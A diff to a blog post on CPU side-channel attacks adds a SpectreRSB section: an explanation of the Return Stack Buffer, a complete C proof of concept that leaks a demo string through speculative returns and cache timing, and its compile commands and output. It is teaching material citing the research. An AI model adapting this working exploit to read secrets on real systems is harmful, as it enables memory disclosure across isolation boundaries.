@@ -645,7 +645,201 @@ In most cases, the secret <code>0</code> was not printed, probably because in th
 
 ### SpectreRSB
 
-The **Return Stack Buffer (RSB)**{: style="color: red"} is a fixed-size buffer that provides predictions for <code>ret</code> instructions. Consider a RSB that can hold $16$ entries. It must drop the oldest entries if a call chain goes deeper than that. As this deep call chain returns, it has actually executed more <code>ret</code> instructions than the number of entries in the RSB and the RSB has underflowed[^12]. 
+Call and return instructions are always executed in pairs. Dedicated to a logical core in case of hyperthreading, the **Return Stack Buffer (RSB)**{: style="color: red"} is a fixed-size buffer that provides predictions for <code>ret</code> instructions. When the CPU executes a call instruction, a new entry (the address of the next instruction) is added to the RSB and the top pointer is incremented; when the CPU executes a return instruction, the value is taken from the RSB, the top pointer is decremented, and the read value is used for return address prediction. Consider a RSB that can hold $16$ entries. It must drop the oldest entries if a call chain goes deeper than that. As this deep call chain returns, it has actually executed more <code>ret</code> instructions than the number of entries in the RSB and the RSB has underflowed[^12].
+
+Here is a simple Proof of Concept implementation of [Koruyeh et al. (2018)](https://dl.acm.org/doi/10.5555/3307423.3307426)[^13]:
+```c
+/* spectre-rsb.c */
+#include <stdio.h>
+#ifdef _MSC_VER
+#include <intrin.h>         /* For rdtscp and clflush */
+#pragma optimize("gt", on)
+#else
+#include <x86intrin.h>      /* For rdtscp and clflush */
+#endif
+
+uint8_t array[256 * 512];
+uint8_t hit[8];
+uint8_t temp = 0;
+
+char *secret = "On the bonnie, bonnie banks of Loch Lomond.";
+
+void flushSideChannel()
+{
+    int i;
+
+    for (i = 0; i < 256; i++) {
+        array[i * 512] = 1;
+    }
+
+    for (i = 0; i < 256; i++) {
+       _mm_clflush(&array[i * 512]);
+    }
+}
+
+/* Serves two purposes: (1) the return address is pushed to the RSB
+ * and (2) create a mismatch between the RSB and the software stack. */
+void spectreGadget()
+{
+    asm volatile(
+        "push       %rbp        \n"
+        "mov        %rsp,%rbp   \n"
+        "pop        %rdi        \n"     /* removes frame/return address */
+        "pop        %rdi        \n"     /* from stack stopping at */
+        "pop        %rdi        \n"     /* next return address*/
+        "nop                    \n"
+        "mov        %rbp,%rsp   \n"
+        "pop        %rbp        \n"
+        "clflush    (%rsp)      \n"     /* flushing creates a large speculative window */
+        "leaveq                 \n"
+        "retq                   \n"     /* triggers speculative return to s = *ptr */
+    );
+}
+
+void spectreAttack(char *ptr)
+{
+    int i;
+    uint8_t s;
+    for (i = 0; i < 256; i++) {
+        _mm_clflush(&array[i * 512]);
+    }
+    for (i = 0; i < 100; i++) { }
+
+    /* modifies the software stack */
+    spectreGadget();
+    /* reads the secret */
+    s = *ptr;
+    /* communicates the secret out */
+    temp &= array[s * 512];
+}
+
+void readMemoryByte(char *ptr, uint8_t value[2], int score[2], uint64_t cache_hit_threshold) {
+    static int results[256];
+    int attempts, i, j, k, mix_i;
+    unsigned int junk = 0;
+    register uint64_t time1, time2;
+    volatile uint8_t *addr;
+
+    for (i = 0; i < 256; i++) {
+        results[i] = 0;
+    }
+
+    for (attempts = 999; attempts > 0; attempts--) {
+        spectreAttack(ptr);
+        /* real return value is obtained and the misspeculation is squashed */
+        for (i = 0; i < 256; i++) {
+            mix_i = ((i * 167) + 13) & 255;
+            addr = &array[mix_i * 512];
+            time1 = __rdtscp(&junk);
+            junk = *addr;
+            time2 = __rdtscp(&junk) - time1;
+            if (time2 <= cache_hit_threshold) {
+                results[mix_i]++;
+            }
+        }
+
+        j = k = -1;
+        for (i = 0; i < 256; i++) {
+            if (j < 0 || results[i] >= results[j]) {
+                k = j;
+                j = i;
+            } else if (k < 0 || results[i] >= results[k]) {
+                k = i;
+            }
+        }
+        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)) {
+            break;
+        }
+        results[0] ^= junk;
+        value[0] = (uint8_t)j;
+        score[0] = results[j];
+        value[1] = (uint8_t)k;
+        score[1] = results[k];
+    }
+}
+
+int main()
+{
+    int i, score[2], len = 43;
+    uint8_t value[2];
+    unsigned int junk = 0;
+    register uint64_t time1, time2 = 0, time3;
+    volatile uint8_t *addr;
+    for (i = 0; i < 1000; i++) {
+        hit[0] = 0x5A;
+        addr = &hit[0];
+        time1 = __rdtscp(&junk);
+        junk = *addr;
+        time2 += __rdtscp(&junk) - time1;
+    }
+    time3 = time2 / 1000;
+    printf("CACHE_HIT_THRESHOLD is calculated as %llu\n", time3);
+
+    printf("Reading %d bytes:\n", len);
+    while (--len >= 0) {
+        printf("Reading at secret = %p... ", (void *)secret);
+        readMemoryByte(secret++, value, score, time3);
+        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
+        printf("0x%02X='%c' score=%-4d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+        if (score[1] > 0) {
+            printf("( second best: 0x%02X score=%-4d)", value[1], score[1]);
+        }
+        printf("\n");
+    }
+    return 0;
+}
+```
+
+Compile the program and run it on my mac machine:
+```console
+$ gcc -march=native -O0 spectre-rsb.c -o spectre-rsb
+$ ./spectre-rsb
+CACHE_HIT_THRESHOLD is calculated as 44
+Reading 43 bytes:
+Reading at secret = 0x10aff3ed8... Success: 0x00='?' score=1    
+Reading at secret = 0x10aff3ed9... Unclear: 0x6E='n' score=933  ( second best: 0x00 score=894 )
+Reading at secret = 0x10aff3eda... Success: 0x20=' ' score=1    
+Reading at secret = 0x10aff3edb... Success: 0x00='?' score=1    
+Reading at secret = 0x10aff3edc... Unclear: 0x68='h' score=990  ( second best: 0x00 score=922 )
+Reading at secret = 0x10aff3edd... Unclear: 0x65='e' score=924  ( second best: 0x00 score=844 )
+Reading at secret = 0x10aff3ede... Unclear: 0x00='?' score=939  ( second best: 0x20 score=914 )
+Reading at secret = 0x10aff3edf... Success: 0x62='b' score=1    
+Reading at secret = 0x10aff3ee0... Success: 0x6F='o' score=6    ( second best: 0x2E score=1   )
+Reading at secret = 0x10aff3ee1... Unclear: 0x6E='n' score=962  ( second best: 0x00 score=900 )
+Reading at secret = 0x10aff3ee2... Success: 0x6E='n' score=1    
+Reading at secret = 0x10aff3ee3... Success: 0x69='i' score=18   ( second best: 0x00 score=7   )
+Reading at secret = 0x10aff3ee4... Success: 0x65='e' score=1    
+Reading at secret = 0x10aff3ee5... Success: 0x2C=',' score=1    
+Reading at secret = 0x10aff3ee6... Success: 0x20=' ' score=1    
+Reading at secret = 0x10aff3ee7... Success: 0x62='b' score=1    
+Reading at secret = 0x10aff3ee8... Unclear: 0x6F='o' score=961  ( second best: 0x00 score=932 )
+Reading at secret = 0x10aff3ee9... Unclear: 0x6E='n' score=964  ( second best: 0x00 score=937 )
+Reading at secret = 0x10aff3eea... Unclear: 0x6E='n' score=957  ( second best: 0x00 score=898 )
+Reading at secret = 0x10aff3eeb... Unclear: 0x69='i' score=987  ( second best: 0x00 score=895 )
+Reading at secret = 0x10aff3eec... Success: 0x65='e' score=1    
+Reading at secret = 0x10aff3eed... Unclear: 0x00='?' score=911  ( second best: 0x20 score=906 )
+Reading at secret = 0x10aff3eee... Success: 0x62='b' score=1    
+Reading at secret = 0x10aff3eef... Success: 0x61='a' score=1    
+Reading at secret = 0x10aff3ef0... Success: 0x6E='n' score=1    
+Reading at secret = 0x10aff3ef1... Success: 0x6B='k' score=1    
+Reading at secret = 0x10aff3ef2... Success: 0x00='?' score=1    
+Reading at secret = 0x10aff3ef3... Success: 0x00='?' score=6    ( second best: 0x20 score=1   )
+Reading at secret = 0x10aff3ef4... Unclear: 0x6F='o' score=951  ( second best: 0x00 score=925 )
+Reading at secret = 0x10aff3ef5... Unclear: 0x66='f' score=946  ( second best: 0x00 score=885 )
+Reading at secret = 0x10aff3ef6... Unclear: 0x20=' ' score=881  ( second best: 0x00 score=763 )
+Reading at secret = 0x10aff3ef7... Unclear: 0x4C='L' score=953  ( second best: 0x00 score=839 )
+Reading at secret = 0x10aff3ef8... Success: 0x6F='o' score=1    
+Reading at secret = 0x10aff3ef9... Success: 0x63='c' score=1    
+Reading at secret = 0x10aff3efa... Unclear: 0x68='h' score=995  ( second best: 0x00 score=953 )
+Reading at secret = 0x10aff3efb... Success: 0x00='?' score=1    
+Reading at secret = 0x10aff3efc... Success: 0x00='?' score=1    
+Reading at secret = 0x10aff3efd... Unclear: 0x6F='o' score=964  ( second best: 0x00 score=936 )
+Reading at secret = 0x10aff3efe... Success: 0x6D='m' score=1    
+Reading at secret = 0x10aff3eff... Success: 0x6F='o' score=1    
+Reading at secret = 0x10aff3f00... Success: 0x6E='n' score=1    
+Reading at secret = 0x10aff3f01... Unclear: 0x64='d' score=957  ( second best: 0x00 score=909 )
+Reading at secret = 0x10aff3f02... Success: 0x2E='.' score=1
+```
 
 ## References
 
@@ -672,3 +866,5 @@ The **Return Stack Buffer (RSB)**{: style="color: red"} is a fixed-size buffer t
 [^11]: Dmitry Evtyushkin, Dmitry Ponomarev, and Nael Abu-Ghazaleh, "Jump over ASLR: Attacking Branch Predictors to Bypass ASLR," In *2016 49th Annual IEEE/ACM International Symposium on Microarchitecture (MICRO)*, October 15-19, 2016, Taipei, Taiwan, China.
 
 [^12]: Return Stack Buffer Underflow / CVE-2022-29901, CVE-2022-28693 / INTEL-SA-00702, [https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/advisory-guidance/return-stack-buffer-underflow.html](https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/advisory-guidance/return-stack-buffer-underflow.html).
+
+[^13]: Esmaeil Mohammadian Koruyeh, Khaled N. Khasawneh, Chengsu Song, and Nael Abu-Ghazaleh, "Spectre Returns! Speculation Attacks Using the Return Stack Buffer," *WOOT'18: Proceedings of the 12th USENIX Conference on Offensive Technologies*, August 2018.
